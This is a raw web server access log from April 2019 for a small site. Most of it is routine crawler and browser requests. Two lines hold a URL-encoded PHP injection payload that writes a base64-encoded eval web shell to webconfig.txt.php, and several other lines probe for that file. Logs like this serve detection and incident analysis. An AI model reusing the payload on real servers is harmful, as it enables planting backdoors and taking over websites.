66.249.69.209 - - [06/Apr/2019:18:01:45 +0200] "GET /robots.txt HTTP/1.1" 200 120
66.249.69.211 - - [06/Apr/2019:18:01:47 +0200] "GET /js/bundles/front_bundle.min.js?v=6.9.1.43334 HTTP/1.1" 200 46092
66.249.69.207 - - [06/Apr/2019:18:01:49 +0200] "GET /templates/creator/m_f/fa/fa7/164/assets/wp-menu.js?v=1519138530 HTTP/1.1" 200 959
216.244.66.248 - - [06/Apr/2019:18:20:43 +0200] "GET /var/m_0/0d/0dd/12455/143518-G2_Optikurs2014_13.JPG HTTP/1.1" 200 66371
216.244.66.248 - - [06/Apr/2019:18:20:48 +0200] "GET /var/m_0/0d/0dd/12455/6564709-G3_SKT2015_37.jpg HTTP/1.1" 200 89585
17.58.99.196 - - [06/Apr/2019:18:20:49 +0200] "GET /galerie.shtml HTTP/1.1" 301 617
17.58.99.196 - - [06/Apr/2019:18:20:50 +0200] "GET /galerie.shtml HTTP/1.1" 200 6129
216.244.66.248 - - [06/Apr/2019:18:24:44 +0200] "GET /robots.txt HTTP/1.1" 301 617
216.244.66.248 - - [06/Apr/2019:18:24:44 +0200] "GET /robots.txt HTTP/1.1" 301 617
216.244.66.248 - - [06/Apr/2019:18:24:45 +0200] "GET /robots.txt HTTP/1.1" 200 120
216.244.66.248 - - [06/Apr/2019:18:24:45 +0200] "GET /robots.txt HTTP/1.1" 200 120
157.55.39.35 - - [06/Apr/2019:18:37:18 +0200] "GET /robots.txt HTTP/1.1" 301 617
157.55.39.35 - - [06/Apr/2019:18:37:19 +0200] "GET /robots.txt HTTP/1.1" 200 120
40.77.167.185 - - [06/Apr/2019:18:37:20 +0200] "GET /index.php?option=com_content&task=view&id=48&Itemid=115 HTTP/1.1" 301 617
139.140.153.81 - - [06/Apr/2019:18:39:39 +0200] "GET //administrator//webconfig.txt.php HTTP/1.1" 301 617
139.140.153.81 - - [06/Apr/2019:18:39:51 +0200] "GET /administrator/webconfig.txt.php HTTP/1.1" 404 5276
192.99.15.141 - - [06/Apr/2019:18:40:17 +0200] "GET /?1=%40ini_set%28%22display_errors%22%2C%220%22%29%3B%40set_time_limit%280%29%3B%40set_magic_quotes_runtime%280%29%3Becho%20%27-%3E%7C%27%3Bfile_put_contents%28%24_SERVER%5B%27DOCUMENT_ROOT%27%5D.%27/webconfig.txt.php%27%2Cbase64_decode%28%27PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2B%27%29%29%3Becho%20%27%7C%3C-%27%3B HTTP/1.1" 200 37315
192.99.15.141 - - [06/Apr/2019:18:40:29 +0200] "GET /?1=%40ini_set%28%22display_errors%22%2C%220%22%29%3B%40set_time_limit%280%29%3B%40set_magic_quotes_runtime%280%29%3Becho%20%27-%3E%7C%27%3Bfile_put_contents%28%24_SERVER%5B%27DOCUMENT_ROOT%27%5D.%27/webconfig.txt.php%27%2Cbase64_decode%28%27PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2B%27%29%29%3Becho%20%27%7C%3C-%27%3B HTTP/1.1" 200 37315
124.28.173.88 - - [06/Apr/2019:18:40:56 +0200] "GET //administrator//webconfig.txt.php HTTP/1.1" 404 5277
188.61.181.66 - - [06/Apr/2019:18:44:14 +0200] "GET /css/widgets/concat_widget.min.css?v=7.0.1.44028 HTTP/1.1" 304 0
188.61.181.66 - - [06/Apr/2019:18:44:14 +0200] "GET /templates/creator/m_f/fa/fa7/164/css/style.min.css?v=1519138530 HTTP/1.1" 304 0
188.61.181.66 - - [06/Apr/2019:18:44:14 +0200] "GET /templates/creator/m_f/fa/fa7/164/assets/respond.min.js?v=1519138530 HTTP/1.1" 304 0
188.61.181.66 - - [06/Apr/2019:18:44:14 +0200] "GET /var/m_0/0d/0dd/12455/125495-15_Event.JPG HTTP/1.1" 304 0
188.61.181.66 - - [06/Apr/2019:18:44:14 +0200] "GET /var/m_0/0d/0dd/12455/8883683-sp_lemm.jpg HTTP/1.1" 304 0
188.61.181.66 - - [06/Apr/2019:18:44:14 +0200] "GET /var/m_0/0d/0dd/12455/8883686-sp_ewd.jpg HTTP/1.1" 304 0
188.61.181.66 - - [06/Apr/2019:18:44:14 +0200] "GET /var/m_0/0d/0dd/12455/8883620-logo_homepage_bootspruefung24_big.png HTTP/1.1" 304 0
188.61.181.66 - - [06/Apr/2019:18:44:14 +0200] "GET /templates/creator/m_f/fa/fa7/164/assets/tab_m_bottom.png HTTP/1.1" 200 1000
188.61.181.66 - - [06/Apr/2019:18:44:14 +0200] "GET /templates/creator/m_f/fa/fa7/164/assets/bt_open.png HTTP/1.1" 200 2044
188.61.181.66 - - [06/Apr/2019:18:44:15 +0200] "GET / HTTP/1.1" 200 6631
188.61.181.66 - - [06/Apr/2019:18:44:15 +0200] "GET /css/skeleton.css HTTP/1.1" 304 0
188.61.181.66 - - [06/Apr/2019:18:44:15 +0200] "GET /templates/creator/m_f/fa/fa7/164/assets/wp-menu.js?v=1519138530 HTTP/1.1" 304 0
188.61.181.66 - - [06/Apr/2019:18:44:15 +0200] "GET /js/bundles/front_bundle.min.js?v=7.0.1.44028 HTTP/1.1" 304 0
188.61.181.66 - - [06/Apr/2019:18:44:15 +0200] "GET /var/m_0/0d/0dd/12455/9114401-g6_SSL_Davos2017_16.jpg HTTP/1.1" 304 0
188.61.181.66 - - [06/Apr/2019:18:44:15 +0200] "GET /var/m_0/0d/0dd/12455/9114323-G3_SKT2018_08.jpg HTTP/1.1" 304 0
188.61.181.66 - - [06/Apr/2019:18:44:15 +0200] "GET /var/m_0/0d/0dd/12455/125493-13_Kurse.JPG HTTP/1.1" 304 0
188.61.181.66 - - [06/Apr/2019:18:44:15 +0200] "GET /var/m_0/0d/0dd/12455/125494-14_Vermietung.JPG HTTP/1.1" 304 0
188.61.181.66 - - [06/Apr/2019:18:44:15 +0200] "GET /templates/creator/m_f/fa/fa7/164/assets/tab_b_bottom.png HTTP/1.1" 200 962
188.61.181.66 - - [06/Apr/2019:18:44:15 +0200] "GET /templates/creator/m_f/fa/fa7/164/css/main.min.css?v=1519138530 HTTP/1.1" 304 0
